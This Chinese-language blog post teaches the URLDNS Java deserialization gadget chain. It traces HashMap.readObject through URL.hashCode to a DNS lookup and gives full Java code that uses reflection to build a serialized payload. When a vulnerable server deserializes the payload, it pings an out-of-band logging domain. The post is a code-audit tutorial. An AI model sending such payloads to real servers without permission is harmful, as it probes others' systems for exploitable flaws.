---
title: URLDNS链
date: 2026-08-02 15:16:51
categories:
  - java代码审计
tags:
  - Java
  - URLDNS
  - 反序列化
---

调用链

```shell
*   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
```

先寻找入口类

URLDNS 是 Java 反序列化漏洞中一条非常经典的利用链，最早由 **ysoserial** 提出，常用于**检测目标是否存在反序列化漏洞**。由于它只用到 JDK 原生类（`HashMap` 和 `URL`），因此不依赖任何第三方库，适用面极广。

必须存在反序列化入口

## 复现流程

hashmap类的put方法里通过调用hash方法

![image-20260802142438156](/images/java-code-audit/14-urldns链/20260802142445268.png)

hash方法里面又调用了hashcode这个函数

![image-20260802142559664](/images/java-code-audit/14-urldns链/20260802142559734.png)

其中我们传入的变量名key，就是我们传入的参数，也就是我们的url

```java
hashmap.put(new URL("DNS生成的 URL，用dnslog就可以"),1);

// 传进去两个参数，key = 前面那串网址，value = 1
```

我们写一串代码

跟进put里

```java
public class URLDNS {
    public static void main(String[] args) throws MalformedURLException {
        HashMap<URL, String> map = new HashMap();
        URL url = new URL("http://lqfpv1qp8ydk0osm5kamrrcynpthhe53.oastify.com");
        map.put(url, "abc");
    }
}
```

开启调试

URL 中的 `hashCode` 被 `handler` 这一对象所调用，`handler` 又是 `URLStreamHandler` 的抽象类。我们再去找 `URLStreamHandler` 的 `hashCode` 方法。

![image-20260802145448380](/images/java-code-audit/14-urldns链/20260802145448441.png)

跟进getHostAddress

![image-20260802145624166](/images/java-code-audit/14-urldns链/20260802145624214.png)

这⾥ `InetAddress.getByName(host)` 的作⽤是根据主机名，获取其 IP 地址，在⽹络上其实就是⼀次 DNS 查询。到这⾥就不必要再跟了。

1. HashMap->readObject()
2. HashMap->hash()
3. URL->hashCode()
4. URLStreamHandler->hashCode()
5. URLStreamHandler->getHostAddress()
6. InetAddress->getByName()

### 强制hashcode等于1

```java
HashMap<URL,Integer> hashmap= new HashMap<URL,Integer>();   
hashmap.put(new URL("DNS生成的 URL，用dnslog就可以"),1);
serialize(hashmap);
```

我们这样写payload，会发现在序列化前，url已经生成了dns请求。这是为什么呢

返回URL类我们传入url这个key值，此时hashcode已经不等于-1了

![image-20260802150232581](/images/java-code-audit/14-urldns链/20260802150232636.png)

我们发现，当 `hashCode` 的值不等于 -1 的时候，函数就会直接 `return hashCode` 而不执行 `hashCode = handler.hashCode(this);`。而一开始定义 HashMap 类的时候`hashCode` 的值为 -1，便是发起了请求。

所以我们在没有反序列化的情况下面，就收到了 DNS 请求，这是不正确的。

最终payload

```java
public static void main(String[] args) throws Exception{  
 Person person = new Person("aa",22);  
 HashMap<URL,Integer> hashmap= new HashMap<URL,Integer>();  
 // 这里不要发起请求  
 URL url = new URL("http://bl00nzimnnujskz418kboqxt9kfb30.oastify.com"); 
 Class c = url.getClass();  
 Field hashcodefile = c.getDeclaredField("hashCode");  
 hashcodefile.setAccessible(true);  
 hashcodefile.set(url,1234);  
 hashmap.put(url,1);  
 // 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性  
 hashcodefile.set(url,-1);  
 serialize(hashmap);  
}
```

完整代码

```java
package com;

import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {

    public static void main(String[] args) throws Exception {
        // 1. 创建 HashMap 实例（序列化用的载体）
        HashMap<URL, Integer> map = new HashMap<>();
        // 2. 创建 URL 对象，指向你的 DNS 日志域名
        URL url = new URL("http://4x7dk5.dnslog.cn");  // 改为你的地址
        // 3. 反射获取 URL 的 hashCode 字段（默认 -1）
        Field hashCodeField = URL.class.getDeclaredField("hashCode");
        hashCodeField.setAccessible(true);
        // 4. 【关键】将 hashCode 设为非 -1 值，避免 put 时触发 DNS
        hashCodeField.set(url, 1234);

        // 5. 把 URL 放入 HashMap，此时不会发 DNS 请求
        map.put(url, 1);

        // 6. 【关键】再设回 -1，这样序列化写入的就是 -1
        hashCodeField.set(url, -1);

        // 7. 序列化整个 HashMap 到文件（或字节数组）
        serialize(map);
        System.out.println("序列化完成，等待反序列化触发 DNS...");

        // 8. 反序列化测试（实际漏洞利用中，这一般发生在远程服务器上）
        deserialize();
    }

    // 序列化方法
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("urldns.ser"));
        oos.writeObject(obj);
        oos.close();
    }

    // 反序列化方法（触发 DNS）
    public static void deserialize() throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("urldns.ser"));
        ois.readObject();  // 这里会触发 DNS 查询
        ois.close();
    }
}
```

